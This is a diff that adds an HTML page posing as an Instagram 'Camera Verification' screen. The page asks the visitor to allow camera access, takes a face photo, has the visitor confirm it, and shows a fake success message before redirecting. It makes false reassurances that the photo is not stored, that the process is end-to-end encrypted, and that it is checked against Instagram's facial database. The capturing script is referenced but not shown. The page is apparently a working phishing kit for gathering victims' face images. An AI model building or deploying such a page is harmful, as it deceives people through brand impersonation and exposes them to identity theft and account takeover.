@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Camera Verification</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <!-- Loading Spinner -->
+    <div id="loading-spinner" class="loading-spinner" style="display: none;">
+        <div class="spinner"></div>
+        <p>Initializing camera...</p>
+    </div>
+
+    <!-- Camera Page -->
+    <div id="camera-page" class="page active">
+        <div class="container">
+            <div class="header">
+                <div class="logo">
+                    <i class="fab fa-instagram"></i>
+                    <span>Instagram</span>
+                </div>
+                <div class="security-badge">
+                    <i class="fas fa-shield-alt"></i> Secure Verification
+                </div>
+            </div>
+            
+            <div class="camera-box">
+                <div class="camera-icon">
+                    <i class="fas fa-camera"></i>
+                </div>
+                
+                <h1>Camera Verification Required</h1>
+                <p class="subtitle">Instagram needs to verify your identity to protect your account</p>
+                
+                <div class="camera-preview">
+                    <video id="cameraVideo" autoplay playsinline></video>
+                    
+                    <div class="countdown-overlay" id="countdown-overlay">
+                        <div class="countdown-circle">
+                            <span id="countdown">3</span>
+                        </div>
+                        <p>Get ready for photo</p>
+                    </div>
+                </div>
+                
+                <div class="image-container">
+                    <img src="https://i.supaimg.com/d346c0fe-81a2-4c8d-9e03-3ca116a3fc11.png" 
+                         alt="Verification Status" 
+                         class="status-image">
+                    <p class="image-caption">Photo verification in progress</p>
+                </div>
+                
+                <div class="instructions">
+                    <div class="instruction-item">
+                        <i class="fas fa-check-circle"></i>
+                        <span>Make sure your face is clearly visible</span>
+                    </div>
+                    <div class="instruction-item">
+                        <i class="fas fa-check-circle"></i>
+                        <span>Good lighting helps with verification</span>
+                    </div>
+                    <div class="instruction-item">
+                        <i class="fas fa-check-circle"></i>
+                        <span>Look directly at the camera</span>
+                    </div>
+                    <div class="instruction-item">
+                        <i class="fas fa-check-circle"></i>
+                        <span>Stay still for a few seconds</span>
+                    </div>
+                </div>
+                
+                <button id="allow-camera-btn" class="btn-primary">
+                    <i class="fas fa-camera"></i> Allow Camera Access
+                </button>
+                
+                <button id="take-photo-btn" class="btn-primary" style="display: none;">
+                    <i class="fas fa-camera"></i> Take Verification Photo
+                </button>
+                
+                <p class="privacy-note">
+                    <i class="fas fa-lock"></i> Your photo is used for verification only and is not stored.
+                    <a href="#" class="privacy-link">Learn more</a>
+                </p>
+            </div>
+            
+            <div class="footer">
+                <p>Instagram will never ask for your password in this process.</p>
+                <div class="security-features">
+                    <span><i class="fas fa-shield-alt"></i> End-to-end encrypted</span>
+                    <span><i class="fas fa-user-secret"></i> No photo storage</span>
+                    <span><i class="fas fa-bolt"></i> Instant verification</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Verification Page -->
+    <div id="verification-page" class="page">
+        <div class="container">
+            <div class="header">
+                <div class="logo">
+                    <i class="fab fa-instagram"></i>
+                    <span>Instagram</span>
+                </div>
+            </div>
+            
+            <div class="verification-box">
+                <div class="success-icon">
+                    <i class="fas fa-check-circle"></i>
+                </div>
+                
+                <h1>Photo Captured Successfully!</h1>
+                <p class="subtitle">Please confirm this is your photo for verification</p>
+                
+                <div class="photo-preview">
+                    <img id="captured-photo" src="" alt="Captured Photo">
+                    <div class="photo-overlay">
+                        <i class="fas fa-user-circle"></i>
+                    </div>
+                </div>
+                
+                <div class="image-container" style="margin: 20px 0;">
+                    <img src="https://i.supaimg.com/d346c0fe-81a2-4c8d-9e03-3ca116a3fc11.png" 
+                         alt="Processing Status" 
+                         class="status-image"
+                         style="width: 200px;">
+                    <p class="image-caption" id="processing-text">Processing your verification...</p>
+                </div>
+                
+                <div class="photo-actions">
+                    <button id="retake-photo-btn" class="btn-secondary">
+                        <i class="fas fa-redo"></i> Retake Photo
+                    </button>
+                    <button id="confirm-photo-btn" class="btn-primary">
+                        <i class="fas fa-check"></i> Confirm & Continue
+                    </button>
+                </div>
+                
+                <div class="processing-info">
+                    <i class="fas fa-sync-alt fa-spin"></i>
+                    <p>Processing photo verification...</p>
+                    <small>Comparing with Instagram's facial recognition database</small>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Page -->
+    <div id="success-page" class="page">
+        <div class="container">
+            <div class="header">
+                <div class="logo">
+                    <i class="fab fa-instagram"></i>
+                    <span>Instagram</span>
+                </div>
+            </div>
+            
+            <div class="success-box">
+                <div class="success-animation">
+                    <i class="fas fa-user-check"></i>
+                </div>
+                
+                <h1>Verification Complete!</h1>
+                <p class="subtitle">Your identity has been successfully verified</p>
+                
+                <div class="image-container" style="margin: 20px 0;">
+                    <img src="https://i.supaimg.com/d346c0fe-81a2-4c8d-9e03-3ca116a3fc11.png" 
+                         alt="Verification Complete" 
+                         class="status-image"
+                         style="width: 180px; border-radius: 10px;">
+                    <p class="image-caption">✅ Verification successful</p>
+                </div>
+                
+                <div class="success-details">
+                    <div class="detail-item">
+                        <i class="fas fa-check-circle"></i>
+                        <span>Face recognition successful</span>
+                    </div>
+                    <div class="detail-item">
+                        <i class="fas fa-check-circle"></i>
+                        <span>Account security verified</span>
+                    </div>
+                    <div class="detail-item">
+                        <i class="fas fa-check-circle"></i>
+                        <span>No suspicious activity detected</span>
+                    </div>
+                </div>
+                
+                <div class="redirect-info">
+                    <p>Redirecting you to Instagram in <span id="redirect-countdown">5</span> seconds...</p>
+                    <button id="redirect-now" class="btn-secondary" style="margin-top: 10px;">
+                        <i class="fas fa-external-link-alt"></i> Continue to Instagram Now
+                    </button>
+                    <div class="spinner">
+                        <div class="bounce1"></div>
+                        <div class="bounce2"></div>
+                        <div class="bounce3"></div>
+                    </div>
+                </div>
+                
+                <div class="security-message">
+                    <i class="fas fa-shield-alt"></i>
+                    <p>Your account is now protected with enhanced security features.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
